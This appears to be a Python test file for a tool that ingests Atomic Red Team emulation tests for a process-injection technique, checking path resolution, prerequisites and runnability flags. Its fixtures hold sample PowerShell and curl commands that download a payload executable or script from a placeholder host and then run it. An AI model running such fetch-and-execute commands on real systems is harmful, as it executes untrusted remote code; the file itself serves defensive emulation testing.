from backend.app.ingestion.atomic_red_team import AtomicRedTeamIngestor


def _document(test: dict) -> dict:
    return {
        "attack_technique": "T1055.011",
        "display_name": "Fixture",
        "atomic_tests": [test],
    }


def test_nested_defaults_paths_and_elevation_are_resolved():
    ingestor = AtomicRedTeamIngestor()
    parsed = ingestor._parse_atomic(_document({
        "name": "nested",
        "auto_generated_guid": "fixture-guid",
        "supported_platforms": ["windows"],
        "input_arguments": {
            "arch": {"type": "string", "default": "x64"},
            "binary": {
                "type": "path",
                "default": r"PathToAtomicsFolder\T1055.011\bin\payload_#{arch}.exe",
            },
        },
        "dependency_executor_name": "powershell",
        "dependencies": [{
            "description": "payload",
            "prereq_command": "if (Test-Path #{binary}) { exit 0 } else { exit 1 }",
            "get_prereq_command": (
                "Invoke-WebRequest https://example.test/payload_x64.exe "
                "-OutFile #{binary}"
            ),
        }],
        "executor": {
            "name": "powershell",
            "command": "& #{binary}",
            "cleanup_command": "Remove-Item #{binary}",
            "elevation_required": True,
        },
    }))[0]

    assert parsed["elevation_required"] is True
    assert "payload_x64.exe" in parsed["command"]
    assert "$env:TEMP\\AtomicPrevention\\atomics" in parsed["command"]
    assert "#{" not in parsed["command"]
    assert "#{" not in parsed["cleanup_command"]
    assert parsed["metadata"]["runnable"] is True
    assert parsed["metadata"]["prerequisites"][0]["executor"] == "powershell"


def test_bash_test_preserves_dependency_executor_without_powershell_setup():
    parsed = AtomicRedTeamIngestor()._parse_atomic(_document({
        "name": "bash",
        "supported_platforms": ["macos"],
        "input_arguments": {
            "script": {
                "type": "path",
                "default": "$PathToAtomicsFolder/T1055.011/src/test.sh",
            },
        },
        "dependency_executor_name": "bash",
        "dependencies": [{
            "description": "script",
            "prereq_command": "test -f #{script}",
            "get_prereq_command": "curl https://example.test/test.sh -o #{script}",
        }],
        "executor": {"name": "bash", "command": "bash #{script}"},
    }))[0]

    assert "${TMPDIR:-/tmp}/AtomicPrevention/atomics" in parsed["command"]
    assert "$env:TEMP" not in parsed["command"]
    assert "New-Item" not in parsed["command"]
    assert parsed["metadata"]["prerequisites"][0]["executor"] == "bash"


def test_required_inputs_and_unacquired_assets_are_not_runnable():
    parsed = AtomicRedTeamIngestor()._parse_atomic(_document({
        "name": "operator input",
        "supported_platforms": ["windows"],
        "input_arguments": {
            "username": {"type": "string", "default": None},
            "asset": {"type": "path", "default": "PathToAtomicsFolder\\asset.exe"},
        },
        "executor": {"name": "command_prompt", "command": "#{asset} #{username}"},
    }))[0]

    assert parsed["metadata"]["runnable"] is False
    assert parsed["metadata"]["required_inputs"] == ["username"]
    assert "#{username}" in parsed["command"]
    assert parsed["metadata"]["missing_asset_setup"] is True


def test_null_optional_argument_resolves_to_empty_string():
    parsed = AtomicRedTeamIngestor()._parse_atomic(_document({
        "name": "optional",
        "supported_platforms": ["windows"],
        "input_arguments": {
            "optional_args": {"type": "string", "default": None},
        },
        "executor": {"name": "command_prompt", "command": "whoami #{optional_args}"},
    }))[0]

    assert parsed["metadata"]["runnable"] is True
    assert "#{" not in parsed["command"]


def test_temp_variables_are_normalized_for_each_executor():
    ingestor = AtomicRedTeamIngestor()

    cmd = ingestor._resolve_paths(r"type $env:TEMP\artifact.txt", "command_prompt")
    bash = ingestor._resolve_paths("cat %TEMP%/artifact.txt", "bash")
    powershell = ingestor._resolve_paths("Get-Content ${TMPDIR}/artifact.txt", "powershell")

    assert cmd == r"type %TEMP%\artifact.txt"
    assert bash == "cat ${TMPDIR:-/tmp}/artifact.txt"
    assert powershell == r"Get-Content $env:TEMP/artifact.txt"


def test_host_modifying_prerequisite_is_catalog_only():
    parsed = AtomicRedTeamIngestor()._parse_atomic(_document({
        "name": "windows capability",
        "supported_platforms": ["windows"],
        "dependencies": [{
            "description": "Install a capability",
            "prereq_command": "if (Get-Command sftp) { exit 0 } else { exit 1 }",
            "get_prereq_command": "Add-WindowsCapability -Online -Name OpenSSH.Client",
        }],
        "dependency_executor_name": "powershell",
        "executor": {"name": "powershell", "command": "sftp localhost"},
    }))[0]

    assert parsed["metadata"]["runnable"] is False
    assert parsed["metadata"]["complex_prereqs"] is True
